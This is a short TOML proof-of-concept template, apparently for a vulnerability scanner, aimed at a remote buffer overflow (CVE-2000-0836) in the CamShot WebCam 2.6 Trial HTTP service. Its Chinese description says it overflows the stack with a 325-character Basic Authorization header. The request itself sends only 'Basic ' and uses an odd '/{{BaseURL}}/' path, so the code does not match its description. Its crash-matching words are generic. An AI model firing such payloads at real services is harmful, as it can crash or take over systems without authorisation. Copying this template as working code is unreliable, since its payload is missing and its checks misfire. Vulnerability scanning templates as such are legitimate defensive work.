[info]
author = "AVE"
description = "通过向 CamShot WebCam 2.6 Trial HTTP 服务发送超长 Authorization 头部（Basic 认证密码字段填充 325 个 'a' 字符），触发栈缓冲区溢出，导致服务崩溃或任意代码执行。远程攻击者无需身份认证即可利用。"
id = "POC-AVE-2000-0622"
name = "CamShot WebCam 2.6 Trial Remote Buffer Overflow PoC"
severity = "high"
tags = ["cve-2000-0836"]
vuln_id = [
    "CVE-2000-0836",
    "AVE-2000-0622",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.headers]
Authorization = "Basic "

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "500",
    "Service Unavailable",
    "connection refused",
]
